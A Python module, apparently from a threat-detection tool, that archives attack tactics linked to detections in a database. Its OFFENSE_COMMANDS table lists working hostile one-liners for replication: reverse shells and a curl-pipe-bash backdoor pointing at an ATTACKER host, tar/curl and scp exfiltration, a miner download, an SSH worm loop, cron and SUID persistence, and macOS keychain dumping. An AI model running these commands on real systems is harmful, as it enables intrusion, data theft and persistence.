"""
Offense archiver — saves replicable attack tactics from real threat detections.
Each tactic includes the attack type, MITRE mapping, and concrete commands
for research/CTF replication.
"""

import json
import uuid
from datetime import datetime, timezone
from python.archive.db import Database
from python.core.ipc_server import emit
from python.core.logger import get_logger

logger = get_logger('offense_archiver')

_SCHEMA = """
CREATE TABLE IF NOT EXISTS offense_tactics (
  id             TEXT PRIMARY KEY,
  created_at     TEXT NOT NULL,
  attack_type    TEXT NOT NULL,
  mitre_id       TEXT,
  mitre_name     TEXT,
  severity       INTEGER,
  technique      TEXT,
  description    TEXT,
  commands_json  TEXT,
  telemetry_json TEXT,
  antibody_id    TEXT
);
CREATE INDEX IF NOT EXISTS idx_offense_type ON offense_tactics(attack_type);
"""

OFFENSE_COMMANDS = {
    'ransomware': [
        "python3 -c \"import os; [open(f+'.locked','wb').write(open(f,'rb').read()) for f in os.listdir('.')]\"",
        "find / -name '*.docx' -exec cp {} {}.locked \\;",
    ],
    'c2_beacon': [
        "while true; do curl -s http://TARGET_IP:4444/beacon; sleep 30; done",
        "python3 -c \"import socket,time; s=socket.socket(); s.connect(('TARGET',4444)); [s.send(b'PING') or time.sleep(30) for _ in iter(int,1)]\"",
    ],
    'keylogger': [
        "python3 -m pynput.keyboard",
        "strace -e trace=read -p TARGET_PID 2>&1 | grep 'read'",
    ],
    'privilege_escalation': [
        "whoami /priv",
        "net localgroup administrators",
        "sudo -l",
        "find / -perm -4000 2>/dev/null",
    ],
    'data_exfil': [
        "tar czf - /target/dir | curl -X POST http://ATTACKER:8080/ --data-binary @-",
        "scp -r /sensitive/ attacker@REMOTE:/loot/",
    ],
    'rootkit': [
        "insmod hidden_module.ko",
        "echo /path/to/lib.so >> /etc/ld.so.preload",
    ],
    'backdoor': [
        "curl -fsSL http://ATTACKER/backdoor.sh | bash",
        "python3 -c \"import socket,subprocess,os; s=socket.socket(); s.connect(('ATTACKER',4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(['/bin/bash'])\"",
    ],
    'cryptominer': [
        "wget http://ATTACKER/miner -O /tmp/.miner && chmod +x /tmp/.miner && /tmp/.miner --pool POOL:PORT",
    ],
    'worm': [
        "for ip in $(seq 1 254); do ssh 10.0.0.$ip 'wget -q http://ATTACKER/worm -O /tmp/w && bash /tmp/w' & done",
    ],
    'reverse_shell': [
        "bash -i >& /dev/tcp/ATTACKER/4444 0>&1",
        "python3 -c \"import socket,subprocess,os; s=socket.socket(); s.connect(('ATTACKER',4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(['/bin/bash'])\"",
    ],
    'persistence_mechanism': [
        "echo '* * * * * /tmp/.backdoor' | crontab -",
        "cp /bin/bash /tmp/.bash; chmod 4755 /tmp/.bash",
    ],
    'gatekeeper_bypass': [
        "xattr -d com.apple.quarantine /path/to/app.app",
        "spctl --add /path/to/app.app",
    ],
    'keychain_access': [
        "security find-generic-password -wa 'Chrome'",
        "security dump-keychain -d login.keychain",
    ],
}

_DESCRIPTIONS = {
    'ransomware':           'Mass file encryption initiated. Files modified at abnormal rate with locked extension.',
    'c2_beacon':            'Command-and-control beaconing to external IP on suspicious port with regular interval.',
    'keylogger':            'Keyboard hook active. Input capture from targeted process.',
    'privilege_escalation': 'Privilege escalation attempt. Admin group and SUID binaries targeted.',
    'data_exfil':           'Large outbound data transfer. Exfiltration pattern confirmed from sensor layer.',
    'rootkit':              'Kernel-level persistence attempted. System directory and preload modified.',
    'backdoor':             'Backdoor installation via remote script execution. Shell access established.',
    'cryptominer':          'Cryptominer deployed. Mining pool connection active with sustained high CPU.',
    'worm':                 'Lateral movement worm. Adjacent hosts being targeted for propagation.',
    'reverse_shell':        'Reverse shell initiated. Outbound connection to attacker with interactive session.',
    'persistence_mechanism': 'Persistence established. Scheduled task or cron modification detected.',
    'gatekeeper_bypass':    'Gatekeeper quarantine flag removed. Unsigned code execution attempted.',
    'keychain_access':      'Keychain dump attempted. Credential extraction from macOS keychain.',
}


class OffenseArchiver:
    def __init__(self, db: Database):
        self.db = db
        db.conn.executescript(_SCHEMA)
        db.conn.commit()

    def save_tactic(self, threat: dict, antibody: dict) -> dict | None:
        attack_type = threat.get('attack_type', 'unknown')
        if attack_type == 'unknown':
            return None

        commands = OFFENSE_COMMANDS.get(attack_type)
        if not commands:
            return None

        severity = threat.get('severity', 0)
        if severity < 3:
            return None

        mitre = threat.get('mitre_id', {})
        tactic_id = str(uuid.uuid4())
        now = datetime.now(timezone.utc).isoformat()

        tel = threat.get('telemetry', {})
        base_desc = _DESCRIPTIONS.get(attack_type, f'Attack pattern detected from {tel.get("source","unknown")} sensor.')
        pid = tel.get('pid')
        name = tel.get('name')
        if pid and name:
            description = f'{base_desc} Triggered by {name} (PID {pid}).'
        else:
            description = base_desc

        record = {
            'id':            tactic_id,
            'created_at':    now,
            'attack_type':   attack_type,
            'mitre_id':      mitre.get('technique_id') if isinstance(mitre, dict) else None,
            'mitre_name':    mitre.get('technique_name') if isinstance(mitre, dict) else None,
            'severity':      int(severity),
            'technique':     mitre.get('technique_name', 'Unknown') if isinstance(mitre, dict) else 'Unknown',
            'description':   description,
            'commands_json': json.dumps(commands),
            'telemetry_json': json.dumps(tel, default=str),
            'antibody_id':   antibody.get('id', ''),
        }

        try:
            self.db.execute("""
                INSERT OR IGNORE INTO offense_tactics VALUES (
                    :id, :created_at, :attack_type, :mitre_id, :mitre_name,
                    :severity, :technique, :description, :commands_json,
                    :telemetry_json, :antibody_id
                )
            """, record)
            self.db.commit()

            emit('OFFENSE_SAVED', {
                'id':          tactic_id,
                'attack_type': attack_type,
                'mitre_id':    record['mitre_id'],
                'mitre_name':  record['mitre_name'],
                'severity':    int(severity),
                'technique':   record['technique'],
                'description': description,
                'commands':    commands,
                'created_at':  now,
                'antibody_id': antibody.get('id', ''),
            })
            logger.info(f'Offense tactic saved: {tactic_id} ({attack_type})')
            return record
        except Exception as e:
            logger.error(f'Offense save failed: {e}')
            return None

    def query(self) -> list:
        try:
            rows = self.db.execute(
                'SELECT * FROM offense_tactics ORDER BY created_at DESC LIMIT 200'
            ).fetchall()
            result = []
            for row in rows:
                d = dict(row)
                d['commands'] = json.loads(d.get('commands_json') or '[]')
                result.append(d)
            return result
        except Exception as e:
            logger.error(f'Offense query failed: {e}')
            return []
